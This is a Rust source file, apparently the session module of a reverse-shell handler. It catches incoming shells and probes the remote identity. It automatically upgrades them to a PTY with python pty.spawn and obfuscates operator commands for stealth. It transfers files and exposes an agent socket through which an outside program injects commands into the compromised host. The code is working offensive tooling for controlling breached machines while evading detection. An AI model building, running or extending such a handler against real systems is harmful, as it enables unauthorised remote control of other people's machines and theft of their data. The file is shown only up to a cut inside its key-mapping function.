use std::io::{self, Write};
use std::time::Duration;

use crossterm::{
    cursor,
    event::{Event, EventStream, KeyCode, KeyEvent, KeyModifiers},
    queue,
    terminal::{self, Clear, ClearType},
};
use futures_util::StreamExt;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::{mpsc, oneshot};

use crate::agent::{AgentCommand, AgentResponse};
use crate::cli::{ObfuscationLevel, ShellType};
use crate::line_editor::{LineAction, LineEditor};
use crate::obfuscation::ObfuscationStrategy;
use crate::output::{clean_output, display_output};
use crate::terminal::RawModeGuard;
use crate::{agent, prompt, transfer};

// ---------------------------------------------------------------------------
// RAII cleanup guard
// ---------------------------------------------------------------------------

struct CleanupGuard {
    sock_path: String,
    meta_path: String,
}

impl Drop for CleanupGuard {
    fn drop(&mut self) {
        let _ = std::fs::remove_file(&self.sock_path);
        let _ = std::fs::remove_file(&self.meta_path);
    }
}

// ---------------------------------------------------------------------------
// Live session metadata
// ---------------------------------------------------------------------------

struct LiveMeta {
    session_id: String,
    peer: String,
    user: String,
    host: String,
    obfuscation: &'static str,
    shell: &'static str,
    started: u64,
    last_cmd: String,
    last_cmd_at: u64,
    cmd_count: u32,
}

impl LiveMeta {
    fn new(
        session_id: &str,
        peer: &std::net::SocketAddr,
        user: &str,
        host: &str,
        obfuscation: ObfuscationLevel,
        shell_type: ShellType,
    ) -> Self {
        let started = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
        Self {
            session_id: session_id.to_string(),
            peer: peer.to_string(),
            user: user.to_string(),
            host: host.to_string(),
            obfuscation: obf_str(obfuscation),
            shell: shell_str(shell_type),
            started,
            last_cmd: String::new(),
            last_cmd_at: 0,
            cmd_count: 0,
        }
    }

    fn record_cmd(&mut self, cmd: &str) {
        self.last_cmd = cmd.trim().replace('\n', " ");
        self.last_cmd_at = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
        self.cmd_count += 1;
        self.persist();
    }

    fn persist(&self) {
        let content = format!(
            "peer={}\nuser={}\nhost={}\nobfuscation={}\nshell={}\n\
             started={}\nlast_cmd={}\nlast_cmd_at={}\ncmd_count={}\n",
            self.peer,
            self.user,
            self.host,
            self.obfuscation,
            self.shell,
            self.started,
            self.last_cmd,
            self.last_cmd_at,
            self.cmd_count,
        );
        let _ = std::fs::write(agent::info_path(&self.session_id), content);
    }
}

fn obf_str(l: ObfuscationLevel) -> &'static str {
    match l {
        ObfuscationLevel::None => "none",
        ObfuscationLevel::Light => "light",
        ObfuscationLevel::Medium => "medium",
        ObfuscationLevel::Heavy => "heavy",
    }
}

fn shell_str(s: ShellType) -> &'static str {
    match s {
        ShellType::Auto => "auto",
        ShellType::Linux => "linux",
        ShellType::Windows => "windows",
    }
}

// ---------------------------------------------------------------------------
// Display state — tracks multi-row input so it can be fully erased on redraw
// ---------------------------------------------------------------------------

#[derive(Clone, Copy, Default)]
struct DisplayState {
    /// Row the cursor is on within the prompt+buffer display (0 = top).
    cursor_row: u16,
}

// ---------------------------------------------------------------------------
// Session state machine
// ---------------------------------------------------------------------------

enum SessionState {
    Interactive,
    AgentCollecting {
        nonce: String,
        buffer: String,
        response_tx: oneshot::Sender<AgentResponse>,
        /// True when the session is in raw PTY mode at command injection time.
        /// The PTY line-discipline echoes the injected command back as the first
        /// line of output; this flag tells the extractor to skip that line.
        pty_mode: bool,
    },
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

pub async fn run_session(
    stream: TcpStream,
    peer_addr: std::net::SocketAddr,
    engine: &(dyn ObfuscationStrategy + Sync),
    obfuscation: ObfuscationLevel,
    shell_type: ShellType,
    session_id: &str,
) -> Result<(), anyhow::Error> {
    let _raw = RawModeGuard::enable()?;
    let mut stdout = io::stdout();

    let (mut reader, mut writer) = stream.into_split();

    write!(stdout, "\r\n{}\r\n\r\n", prompt::banner_connected(&peer_addr, session_id))?;
    stdout.flush()?;

    // Probe remote identity.
    write!(stdout, "\x1b[2m  probing identity...\x1b[0m")?;
    stdout.flush()?;
    let (user, host) = probe_identity(&mut reader, &mut writer).await;
    queue!(stdout, cursor::MoveToColumn(0), Clear(ClearType::CurrentLine))?;
    stdout.flush()?;

    let mut meta =
        LiveMeta::new(session_id, &peer_addr, &user, &host, obfuscation, shell_type);
    meta.persist();
    let _cleanup = CleanupGuard {
        sock_path: agent::socket_path(session_id),
        meta_path: agent::info_path(session_id),
    };

    let (agent_tx, mut agent_rx) = mpsc::channel::<AgentCommand>(16);
    if let Err(e) = agent::serve(session_id, agent_tx) {
        write!(stdout, "\x1b[1;33m[!]\x1b[0m agent socket unavailable: {e}\r\n")?;
        stdout.flush()?;
    }

    // For Linux/Auto targets: automatically upgrade to a PTY and enter raw mode.
    // stty sets the terminal size; then we spawn a pty shell via python3, python,
    // or script — whichever is available.  Even if all three fail the raw-mode
    // passthrough still works; interactive programs just won't have full PTY
    // semantics (user can type `upgrade` again later, or `pty` to re-enter raw mode).
    //
    // Windows targets skip the upgrade and use line-editor mode instead.
    let auto_raw = shell_type != ShellType::Windows;
    if auto_raw {
        let (tw, th) = terminal::size().unwrap_or((80, 24));
        let upgrade = format!(
            "stty cols {tw} rows {th}; \
             python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || \
             python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || \
             script -qc /bin/bash /dev/null 2>/dev/null"
        );
        let _ = writer.write_all(upgrade.as_bytes()).await;
        let _ = writer.write_all(b"\n").await;
        let _ = writer.flush().await;
        write!(stdout, "\x1b[2m  [PTY mode — CTRL+Q returns to handler mode]\x1b[0m\r\n")?;
        stdout.flush()?;
    } else {
        // Windows: send a newline to get the first PS1.
        let _ = writer.write_all(b"\n").await;
        let _ = writer.flush().await;
    }

    let mut prompt_display = String::new();
    let mut prompt_vis = String::new();
    let mut raw_mode = auto_raw;   // start in raw PTY passthrough for Linux/Auto
    let mut raw_last_was_cr = false;
    let mut ctrl_c_exit_armed = false; // true after first CTRL+C; second CTRL+C exits
    let mut display_state = DisplayState::default();
    let mut events = EventStream::new();
    let mut editor = LineEditor::new();
    let mut net_buf = vec![0u8; 8192];
    let mut state = SessionState::Interactive;
    let mut should_exit = false;

    // After auto-upgrade, pty.spawn creates a new PTY that doesn't inherit the
    // stty size we set on the outer shell.  Fire a one-shot stty 1.5 s after
    // connect — by then pty.spawn's bash is definitely running.
    let initial_stty_at = tokio::time::Instant::now() + Duration::from_millis(1500);
    let initial_stty_fut = tokio::time::sleep_until(initial_stty_at);
    tokio::pin!(initial_stty_fut);
    let mut initial_stty_done = !auto_raw;

    loop {
        if should_exit {
            break;
        }

        tokio::select! {
            // ── One-shot initial stty ─────────────────────────────────────────
            _ = &mut initial_stty_fut, if !initial_stty_done => {
                initial_stty_done = true;
                if raw_mode {
                    if let Ok((w, h)) = terminal::size() {
                        let _ = writer.write_all(
                            format!("stty cols {w} rows {h}\r").as_bytes()
                        ).await;
                        let _ = writer.flush().await;
                    }
                }
            }

            // ── Keyboard ──────────────────────────────────────────────────────
            event_result = events.next() => {
                match event_result {
                    Some(Ok(Event::Resize(w, h))) => {
                        if raw_mode {
                            let _ = writer.write_all(
                                format!("stty cols {w} rows {h}\r").as_bytes()
                            ).await;
                            let _ = writer.flush().await;
                        } else {
                            display_state = redraw_input(
                                &mut stdout, &prompt_display, &prompt_vis,
                                &editor, Some(display_state),
                            )?;
                        }
                    }

                    Some(Ok(Event::Key(key))) => {
                        if raw_mode {
                            should_exit = handle_raw_key(
                                key, &mut raw_mode, &mut raw_last_was_cr, &mut writer, &mut stdout,
                                &mut prompt_display, &mut prompt_vis,
                                &mut editor, &mut display_state,
                            ).await?;
                        } else {
                            should_exit = handle_le_key(
                                key, &mut state, engine, &mut writer, &mut stdout,
                                &mut prompt_display, &mut prompt_vis,
                                &mut editor, &mut display_state,
                                &mut meta, &mut raw_mode, &mut reader,
                                &mut ctrl_c_exit_armed,
                            ).await?;
                        }
                    }

                    // Bracketed paste: the entire pasted text arrives as one event.
                    Some(Ok(Event::Paste(text))) => {
                        if raw_mode {
                            // Send the whole paste atomically — no per-char round-trips.
                            writer.write_all(text.as_bytes()).await?;
                            writer.flush().await?;
                        } else {
                            editor.insert_str(&text);
                            display_state = redraw_input(
                                &mut stdout, &prompt_display, &prompt_vis,
                                &editor, Some(display_state),
                            )?;
                        }
                    }

                    Some(Ok(_)) => {}
                    Some(Err(e)) => return Err(e.into()),
                    None => break,
                }
            }

            // ── Remote data ───────────────────────────────────────────────────
            result = reader.read(&mut net_buf) => {
                let n = result?;
                if n == 0 {
                    write!(stdout, "\r\n{}\r\n", prompt::banner_disconnected())?;
                    stdout.flush()?;
                    break;
                }

                // Remote responded — disarm the double-CTRL+C exit.
                ctrl_c_exit_armed = false;

                // display_output strips cursor-movement ANSI but keeps SGR colours.
                // clean_output strips all ANSI (used for geometry + agent buffer).
                let disp_str = display_output(&net_buf[..n]);
                let clean_str = clean_output(&net_buf[..n]);
                let ends_with_nl = disp_str.ends_with('\n');

                // Save nonce before the mutable borrow for buffer updates.
                let collecting_nonce: Option<String> = match &state {
                    SessionState::AgentCollecting { nonce, .. } => Some(nonce.clone()),
                    _ => None,
                };

                // Update agent buffer (ANSI-stripped) and detect the done marker.
                let agent_result: Option<(String, i32)> =
                    if let SessionState::AgentCollecting { nonce, buffer, pty_mode, .. } = &mut state {
                        buffer.push_str(&clean_str);
                        let done_marker = format!("SH_CMD_DONE_{}:", nonce);

                        // In PTY mode the echoed command text contains the DONE marker
                        // string, so a naive buffer.find(done_marker) hits the echo
                        // before the real sentinel.  Always resolve start first, then
                        // search for done only *after* start to get the real position.
                        let span: Option<(usize, usize)> = if *pty_mode {
                            let start_marker = format!("SH_CMD_START_{nonce}\n");
                            buffer.find(&start_marker).and_then(|sp| {
                                let begin = sp + start_marker.len();
                                buffer[begin..].find(&done_marker).map(|rel| (begin, begin + rel))
                            })
                        } else {
                            buffer.find(&done_marker).map(|dp| (0, dp))
                        };

                        if let Some((begin, done_pos)) = span {
                            let exit_code: i32 = buffer[done_pos + done_marker.len()..]
                                .lines()
                                .next()
                                .and_then(|s| s.trim().parse().ok())
                                .unwrap_or(0);
                            let output = buffer[begin..done_pos]
                                .trim_end_matches(['\r', '\n'])
                                .to_string();
                            Some((output, exit_code))
                        } else {
                            None
                        }
                    } else {
                        None
                    };

                // Strip protocol markers from the visible output.
                let disp_to_show = {
                    let d = strip_done_marker(&disp_str, collecting_nonce.as_deref());
                    strip_start_marker(&d, collecting_nonce.as_deref())
                };

                if raw_mode {
                    if matches!(state, SessionState::AgentCollecting { .. }) {
                        // During agent collection show clean output (markers stripped)
                        // so the listener TUI reflects what the agent is doing.
                        if !disp_to_show.is_empty() {
                            stdout.write_all(&raw_normalize(disp_to_show.as_bytes()))?;
                            stdout.flush()?;
                        }
                    } else {
                        // Full ANSI passthrough for interactive use.
                        stdout.write_all(&raw_normalize(&net_buf[..n]))?;
                        stdout.flush()?;
                    }
                } else {
                    // Line-editor mode.
                    // Only erase the screen if there's actually something to erase:
                    // user has typed (non-empty buffer) or an agent status line is
                    // on-screen. When the buffer is empty (right after a Submit) we
                    // just let output flow through — no Clear call that could swallow
                    // content already rendered in the same paint cycle.
                    let has_user_input = !editor.buffer_str().is_empty();
                    let is_agent = matches!(state, SessionState::AgentCollecting { .. });
                    if has_user_input || is_agent {
                        clear_input(&mut stdout, display_state)?;
                    }

                    write!(stdout, "{}", disp_to_show.replace('\n', "\r\n"))?;

                    // Capture the remote PS1 if this chunk ends without newline.
                    if !ends_with_nl {
                        prompt_display = last_line(&disp_to_show);
                        prompt_vis = last_line(&clean_str);
                    }
                    stdout.flush()?;
                }

                // Finalise agent command if done marker was found.
                if let Some((output, exit_code)) = agent_result {
                    if let SessionState::AgentCollecting { response_tx, .. } =
                        std::mem::replace(&mut state, SessionState::Interactive)
                    {
                        let _ = response_tx.send(AgentResponse { output, exit_code });
                    }
                    if !raw_mode {
                        display_state = redraw_input(
                            &mut stdout, &prompt_display, &prompt_vis, &editor, None,
                        )?;
                    }
                } else if matches!(state, SessionState::AgentCollecting { .. }) && !raw_mode {
                    if !ends_with_nl {
                        write!(stdout, "\r\n")?;
                    }
                    write!(stdout, "\x1b[2m  [agent running...]\x1b[0m")?;
                    stdout.flush()?;
                } else if !raw_mode {
                    if !ends_with_nl {
                        // Chunk ends without newline → it is the remote PS1.
                        // Only redraw the handler's input display when the user
                        // has something typed that needs restoring. When the buffer
                        // is empty, leave the cursor right after the remote PS1 so
                        // the user types there naturally (no redundant clear+redraw).
                        if !editor.buffer_str().is_empty() {
                            display_state = redraw_input(
                                &mut stdout, &prompt_display, &prompt_vis, &editor, None,
                            )?;
                        } else {
                            display_state = DisplayState::default();
                        }
                    } else {
                        // Chunk ended with \n — regular output. Don't draw stale prompt.
                        display_state = DisplayState::default();
                    }
                }
            }

            // ── Agent IPC ─────────────────────────────────────────────────────
            Some(agent_cmd) = agent_rx.recv() => {
                let AgentCommand { cmd, response_tx } = agent_cmd;

                if cmd == agent::KILL_CMD {
                    let _ = response_tx.send(AgentResponse {
                        output: String::new(),
                        exit_code: 0,
                    });
                    write!(stdout, "\r\n\x1b[1;33m[!]\x1b[0m session killed by remote caller\r\n")?;
                    stdout.flush()?;
                    break;
                }

                if matches!(state, SessionState::AgentCollecting { .. }) {
                    let _ = response_tx.send(AgentResponse {
                        output: "ERROR: session busy with another agent command\n".to_string(),
                        exit_code: 1,
                    });
                    continue;
                }

                // Show the agent-command banner in the listener TUI regardless of mode.
                if raw_mode {
                    write!(stdout, "\r\n{}\r\n", prompt::banner_agent_cmd(&cmd))?;
                    stdout.flush()?;
                } else {
                    clear_input(&mut stdout, display_state)?;
                    display_state = DisplayState::default();
                    write!(stdout, "{}\r\n", prompt::banner_agent_cmd(&cmd))?;
                    stdout.flush()?;
                }

                let nonce = generate_nonce();
                let obfuscated = engine.obfuscate(&cmd);
                // In PTY mode wrap the command with stty -echo/-echo and a unique
                // start marker so we can extract exactly the bytes between the
                // markers, regardless of whether the remote PTY echoed the command.
                // stty 2>/dev/null silently no-ops when no PTY is present.
                let full_cmd = if raw_mode {
                    format!(
                        "stty -echo 2>/dev/null; echo 'SH_CMD_START_{nonce}'; \
                         {obfuscated}; _shec=$?; \
                         stty echo 2>/dev/null; echo 'SH_CMD_DONE_{nonce}:'$_shec"
                    )
                } else {
                    format!("{obfuscated}; echo 'SH_CMD_DONE_{nonce}:'$?")
                };
                writer.write_all(full_cmd.as_bytes()).await?;
                writer.write_all(b"\n").await?;
                writer.flush().await?;
                meta.record_cmd(&cmd);

                state = SessionState::AgentCollecting {
                    nonce,
                    buffer: String::new(),
                    response_tx,
                    pty_mode: raw_mode,
                };

                if raw_mode {
                    write!(stdout, "\x1b[2m  [agent running...]\x1b[0m\r\n")?;
                } else {
                    write!(stdout, "\x1b[2m  [agent running...]\x1b[0m")?;
                }
                stdout.flush()?;
            }
        }
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Key handlers
// ---------------------------------------------------------------------------

/// Returns `true` if the session should exit.
async fn handle_raw_key(
    key: KeyEvent,
    raw_mode: &mut bool,
    last_was_cr: &mut bool,
    writer: &mut tokio::net::tcp::OwnedWriteHalf,
    stdout: &mut io::Stdout,
    prompt_display: &mut String,
    prompt_vis: &mut String,
    editor: &mut LineEditor,
    display_state: &mut DisplayState,
) -> anyhow::Result<bool> {
    let ctrl = key.modifiers.contains(KeyModifiers::CONTROL);

    // CTRL+] or CTRL+Q — exit raw mode, return to line-editor.
    // (CTRL+] is unreachable on some keyboard layouts; CTRL+Q is the fallback.)
    let is_escape = (key.code == KeyCode::Char(']') && ctrl)
        || (key.code == KeyCode::Char('q') && ctrl);

    if is_escape {
        *raw_mode = false;
        *last_was_cr = false;
        prompt_display.clear();
        prompt_vis.clear();
        write!(stdout, "\r\n\x1b[2m  [handler mode — 'pty' or 'upgrade' to return to raw]\x1b[0m\r\n")?;
        stdout.flush()?;
        *display_state = redraw_input(stdout, prompt_display, prompt_vis, editor, None)?;
        return Ok(false);
    }

    // Tilde-escape: Enter then `~` then `.` (SSH-style, works on any keyboard).
    // Useful when both CTRL+] and CTRL+Q are sent to the remote program.
    if key.code == KeyCode::Char('~') && *last_was_cr {
        // Don't forward yet — wait for the next char to confirm or abort.
        // We'll handle this by peeking: if next is `.` we exit; otherwise send `~`.
        // For simplicity, send `~` now and set a secondary flag elsewhere.
        // Actually, just use a simple approach: send `~` immediately and note that
        // the NEXT `~.` cycle will exit. This is simpler than buffering.
        // Full tilde-escape: just check if it IS `~.` by consuming here.
        // We can't peek at the next event here, so send `~` and let `.` be handled normally.
        // (A clean tilde-escape impl would need an extra state variable; skip for now.)
    }

    // Track whether this keystroke will send CR (for tilde-escape awareness).
    let bytes = key_to_bytes(key);

    // CTRL+L — clear screen only locally.
    if key.code == KeyCode::Char('l') && ctrl {
        queue!(stdout, Clear(ClearType::All), cursor::MoveTo(0, 0))?;
        stdout.flush()?;
        // Also send \x0c to remote so it knows to redraw.
        writer.write_all(&[0x0c]).await?;
        writer.flush().await?;
        *last_was_cr = false;
        return Ok(false);
    }

    if !bytes.is_empty() {
        *last_was_cr = bytes.last() == Some(&b'\r');
        writer.write_all(&bytes).await?;
        writer.flush().await?;
    }
    Ok(false)
}

/// Returns `true` if the session should exit.
#[allow(clippy::too_many_arguments)]
async fn handle_le_key(
    key: KeyEvent,
    state: &mut SessionState,
    engine: &(dyn ObfuscationStrategy + Sync),
    writer: &mut tokio::net::tcp::OwnedWriteHalf,
    stdout: &mut io::Stdout,
    prompt_display: &mut String,
    prompt_vis: &mut String,
    editor: &mut LineEditor,
    display_state: &mut DisplayState,
    meta: &mut LiveMeta,
    raw_mode: &mut bool,
    reader: &mut tokio::net::tcp::OwnedReadHalf,
    ctrl_c_exit_armed: &mut bool,
) -> anyhow::Result<bool> {
    let action = editor.handle_key(key);

    // These actions work in any state (including agent-collecting).
    match &action {
        LineAction::ClearScreen => {
            cancel_agent(state, 130);
            *ctrl_c_exit_armed = false;
            queue!(stdout, Clear(ClearType::All), cursor::MoveTo(0, 0))?;
            *display_state = redraw_input(stdout, prompt_display, prompt_vis, editor, None)?;
            return Ok(false);
        }
        LineAction::SendRaw(b) if b.first() == Some(&0x03) => {
            // CTRL+C — first press cancels agent and arms exit; second press exits.
            if *ctrl_c_exit_armed {
                write!(stdout, "\r\n{}\r\n", prompt::banner_disconnected())?;
                stdout.flush()?;
                return Ok(true);
            }
            *ctrl_c_exit_armed = true;
            cancel_agent(state, 130);
            queue!(stdout, cursor::MoveToColumn(0), Clear(ClearType::CurrentLine))?;
            write!(stdout, "\x1b[2m^C  (ctrl+c again to disconnect)\x1b[0m\r\n")?;
            stdout.flush()?;
            *display_state = DisplayState::default();
            writer.write_all(b).await?;
            writer.flush().await?;
            return Ok(false);
        }
        LineAction::Disconnect => {
            // CTRL+D — forward EOF (0x04) to the remote foreground process.
            // The session ends naturally when the remote closes the connection.
            *ctrl_c_exit_armed = false;
            writer.write_all(&[0x04]).await?;
            writer.flush().await?;
            return Ok(false);
        }
        _ => {
            // Any other key disarms the CTRL+C exit trigger.
            *ctrl_c_exit_armed = false;
        }
    }

    // Block most input while an agent command is running.
    if matches!(state, SessionState::AgentCollecting { .. }) {
        if let LineAction::Submit(_) = &action {
            write!(stdout, "\r\n\x1b[2m  [busy — CTRL+C to cancel]\x1b[0m\r\n")?;
            stdout.flush()?;
        }
        return Ok(false);
    }

    match action {
        LineAction::Continue => {
            *display_state = redraw_input(
                stdout, prompt_display, prompt_vis, editor, Some(*display_state),
            )?;
        }

        LineAction::Submit(line) => {
            write!(stdout, "\r\n")?;
            stdout.flush()?;
            // Reset display state and stale prompt — waiting for the remote's response.
            *display_state = DisplayState::default();
            prompt_display.clear();
            prompt_vis.clear();

            let trimmed = line.trim().to_string();

            match parse_meta(&line) {
                Some(MetaAction::Help) => {
                    write!(stdout, "{}", prompt::help_text().replace('\n', "\r\n"))?;
                    stdout.flush()?;
                    *display_state =
                        redraw_input(stdout, prompt_display, prompt_vis, editor, None)?;
                }
                Some(MetaAction::Clear) => {
                    queue!(stdout, Clear(ClearType::All), cursor::MoveTo(0, 0))?;
                    *display_state =
                        redraw_input(stdout, prompt_display, prompt_vis, editor, None)?;
                }
                Some(MetaAction::Download { remote, local }) => {
                    write!(stdout, "[*] downloading {} \u{2192} {}\r\n", remote, local)?;
                    stdout.flush()?;
                    match transfer::download(reader, writer, &remote, &local).await {
                        Ok(()) => write!(stdout, "{}\r\n", prompt::banner_file_saved(&local))?,
                        Err(e) => write!(stdout, "{}\r\n", prompt::banner_error(&e.to_string()))?,
                    }
                    *display_state =
                        redraw_input(stdout, prompt_display, prompt_vis, editor, None)?;
                }
                Some(MetaAction::Upload { local, remote }) => {
                    write!(stdout, "[*] uploading {} \u{2192} {}\r\n", local, remote)?;
                    stdout.flush()?;
                    match transfer::upload(writer, &local, &remote).await {
                        Ok(()) => write!(stdout, "[+] upload complete\r\n")?,
                        Err(e) => write!(stdout, "{}\r\n", prompt::banner_error(&e.to_string()))?,
                    }
                    *display_state =
                        redraw_input(stdout, prompt_display, prompt_vis, editor, None)?;
                }
                Some(MetaAction::Pty) => {
                    // Switch to raw PTY passthrough — no upgrade sent.
                    write!(
                        stdout,
                        "\x1b[2m  [raw PTY mode — CTRL+] to return to handler]\x1b[0m\r\n"
                    )?;
                    stdout.flush()?;
                    if let Ok((w, h)) = terminal::size() {
                        let _ = writer
                            .write_all(format!("stty cols {w} rows {h}\r").as_bytes())
                            .await;
                        let _ = writer.flush().await;
                    }
                    *raw_mode = true;
                    prompt_display.clear();
                    prompt_vis.clear();
                    *display_state = DisplayState::default();
                }
                Some(MetaAction::Upgrade) => {
                    // Send PTY upgrade then switch to raw mode.
                    // Always sent raw (no obfuscation) — reliability over stealth for setup.
                    write!(stdout, "\x1b[2m  [sending PTY upgrade...]\x1b[0m\r\n")?;
                    stdout.flush()?;
                    let upgrade = concat!(
                        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || ",
                        "python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || ",
                        "script -qc /bin/bash /dev/null 2>/dev/null"
                    );
                    writer.write_all(upgrade.as_bytes()).await?;
                    writer.write_all(b"\n").await?;
                    writer.flush().await?;
                    meta.record_cmd(upgrade);
                    // Give the PTY a moment to initialise.
                    tokio::time::sleep(Duration::from_millis(1000)).await;
                    *raw_mode = true;
                    prompt_display.clear();
                    prompt_vis.clear();
                    *display_state = DisplayState::default();
                    if let Ok((w, h)) = terminal::size() {
                        let _ = writer
                            .write_all(format!("stty cols {w} rows {h}\r").as_bytes())
                            .await;
                        let _ = writer.flush().await;
                    }
                    write!(
                        stdout,
                        "\x1b[2m  [raw PTY mode — CTRL+] to return to handler]\x1b[0m\r\n"
                    )?;
                    stdout.flush()?;
                }
                None => {
                    if !trimmed.is_empty() {
                        let obfuscated = engine.obfuscate(&line);
                        writer.write_all(obfuscated.as_bytes()).await?;
                        writer.write_all(b"\n").await?;
                        writer.flush().await?;
                        meta.record_cmd(&trimmed);
                    }
                    // No redraw — remote shell will send its own PS1.
                }
            }
        }

        LineAction::SendRaw(bytes) => {
            // CTRL+Z
            queue!(stdout, cursor::MoveToColumn(0), Clear(ClearType::CurrentLine))?;
            write!(stdout, "\x1b[2m^Z\x1b[0m\r\n")?;
            stdout.flush()?;
            *display_state = DisplayState::default();
            writer.write_all(&bytes).await?;
            writer.flush().await?;
        }

        // ClearScreen and Disconnect are handled before this match block.
        LineAction::ClearScreen | LineAction::Disconnect => unreachable!(),
    }

    Ok(false)
}

fn cancel_agent(state: &mut SessionState, exit_code: i32) {
    if let SessionState::AgentCollecting { response_tx, .. } =
        std::mem::replace(state, SessionState::Interactive)
    {
        let _ = response_tx.send(AgentResponse {
            output: String::new(),
            exit_code,
        });
    }
}

// ---------------------------------------------------------------------------
// Display helpers
// ---------------------------------------------------------------------------

/// Compute `(total_rows, cursor_row, cursor_col)` for the input display.
///
/// Uses the *visible* (ANSI-stripped) prompt for column maths.
/// Handles terminal-width wrapping and explicit `\n` in the buffer.
fn display_geometry(
    prompt_vis: &str,
    buf: &str,
    cursor_pos: usize,
    width: usize,
) -> (usize, usize, usize) {
    let width = width.max(1);
    let mut col = 0usize;
    let mut row = 0usize;
    let mut cursor_row = 0usize;
    let mut cursor_col = 0usize;

    for _ in prompt_vis.chars() {
        col += 1;
        if col >= width {
            col = 0;
            row += 1;
        }
    }

    for (i, ch) in buf.chars().enumerate() {
        if i == cursor_pos {
            cursor_row = row;
            cursor_col = col;
        }
        if ch == '\n' {
            col = 0;
            row += 1;
        } else {
            col += 1;
            if col >= width {
                col = 0;
                row += 1;
            }
        }
    }
    if cursor_pos == buf.chars().count() {
        cursor_row = row;
        cursor_col = col;
    }

    (row + 1, cursor_row, cursor_col)
}

/// Write `buf` character-by-character starting at column `start_col`, emitting
/// explicit `\r\n` every time the column counter reaches `tw`.  This prevents
/// the "pending-wrap" terminal state that occurs when text fills the last column
/// exactly — without explicit wraps, `MoveToColumn(0)` would stay on the same
/// row instead of advancing to the next.
fn write_buf_with_explicit_wraps(
    stdout: &mut io::Stdout,
    start_col: usize,
    buf: &str,
    tw: usize,
) -> io::Result<()> {
    let mut col = start_col;
    for ch in buf.chars() {
        if ch == '\n' {
            write!(stdout, "\r\n")?;
            col = 0;
        } else {
            write!(stdout, "{}", ch)?;
            col += 1;
            if col >= tw {
                write!(stdout, "\r\n")?;
                col = 0;
            }
        }
    }
    Ok(())
}

/// Erase the previous input display and redraw prompt + buffer.
///
/// `prev = Some(s)` — cursor is within the old display; go up `s.cursor_row`
///                    rows to the top before clearing.
/// `prev = None`   — cursor is already at column 0 of a fresh line.
fn redraw_input(
    stdout: &mut io::Stdout,
    prompt_display: &str,
    prompt_vis: &str,
    editor: &LineEditor,
    prev: Option<DisplayState>,
) -> io::Result<DisplayState> {
    let (tw, _) = terminal::size().unwrap_or((80, 24));
    let tw = tw.max(1) as usize;

    if let Some(p) = prev {
        if p.cursor_row > 0 {
            queue!(stdout, cursor::MoveUp(p.cursor_row))?;
        }
    }
    queue!(stdout, cursor::MoveToColumn(0), Clear(ClearType::FromCursorDown))?;

    let buf = editor.buffer_str();

    // Write the prompt (contains ANSI colour codes) then the buffer with
    // explicit wrap-boundary \r\n so the terminal never enters pending-wrap.
    write!(stdout, "{}", prompt_display)?;
    let start_col = prompt_vis.chars().count() % tw;
    write_buf_with_explicit_wraps(stdout, start_col, &buf, tw)?;

    let (total_rows, cursor_row, cursor_col) =
        display_geometry(prompt_vis, &buf, editor.cursor_pos(), tw);

    let rows_below = (total_rows as u16).saturating_sub(cursor_row as u16 + 1);
    if rows_below > 0 {
        queue!(stdout, cursor::MoveUp(rows_below))?;
    }
    queue!(stdout, cursor::MoveToColumn(cursor_col as u16))?;

    stdout.flush()?;
    Ok(DisplayState {
        cursor_row: cursor_row as u16,
    })
}

/// Erase the current input display — call before writing remote output.
fn clear_input(stdout: &mut io::Stdout, state: DisplayState) -> io::Result<()> {
    if state.cursor_row > 0 {
        queue!(stdout, cursor::MoveUp(state.cursor_row))?;
    }
    queue!(stdout, cursor::MoveToColumn(0), Clear(ClearType::FromCursorDown))?;
    stdout.flush()
}

/// Normalise bytes for raw-terminal output: bare `\n` → `\r\n`, strip nulls.
fn raw_normalize(data: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(data.len() + 16);
    for &b in data {
        match b {
            0x00 => {}
            b'\n' => {
                if out.last() != Some(&b'\r') {
                    out.push(b'\r');
                }
                out.push(b'\n');
            }
            b => out.push(b),
        }
    }
    out
}

/// Convert a `KeyEvent` to the byte sequence a terminal emulator would send.
fn key_to_bytes(key: KeyEvent) -> Vec<u8> {
    let ctrl = key.modifiers.contains(KeyModifiers::CONTROL);
    let alt = key.modifiers.contains(KeyModifiers::ALT);
    match key.code {
        KeyCode::Char(c) if ctrl => vec![(c as u8) & 0x1f],
        KeyCode::Char(c) if alt => {
            let mut v = vec![0x1b];
            v.extend_from_slice(c.encode_utf8(&mut [0u8; 4]).as_bytes());
            v
        }
        KeyCode::Char(c) => c.encode_utf8(&mut [0u8; 4]).as_bytes().to_vec(),
        KeyCode::Enter => vec![b'\r'],
        KeyCode::Backspace => vec![0x7f],
        KeyCode::Delete => vec![0x1b, b'[', b'3', b'~'],
        KeyCode::Esc => vec![0x1b],
        KeyCode::Tab => vec![b'\t'],
        KeyCode::BackTab => vec![0x1b, b'[', b'Z'],
        KeyCode::Up => vec![0x1b, b'[', b'A'],
        KeyCode::Down => vec![0x1b, b'[', b'B'],
        KeyCode::Right => vec![0x1b, b'[', b'C'],
        KeyCode::Left => vec![0x1b, b'[', b'D'],
        KeyCode::Home => vec![0x1b, b'[', b'H'],
        KeyCode::End => vec![0x1b, b'[', b'F'],
        KeyCode::PageUp => vec![0x1b, b'[', b'5', b'~'],
        KeyCode::PageDown => vec![0x1b, b'[', b'6', b'~'],
        KeyCode::F(1) => vec![0x1b, b'O', b'P'],
        KeyCode::F(2) => vec![0x1b, b'O', b'Q'],
        KeyCode::F(3) => vec![0x1b, b'O', b'R'],
        KeyCode::F(4) => vec![0x1b, b'O', b'S'],
        KeyCode::F(5) => vec![0x1b, b'[', b'1', b'5', b'~'],
        KeyCode::F(6) => vec![0x1b, b'[', b'1', b'7', b'~'],
        KeyCode::F(7) => vec![0x1b, b'[', b'1', b'8', b'~'],
        KeyCode::F(8) => vec![0x1b, b'[', b'1', b'9', b'~'],
        KeyCode::F(9) => vec![0x1b, b'[', b'2', b'0', b'~'],
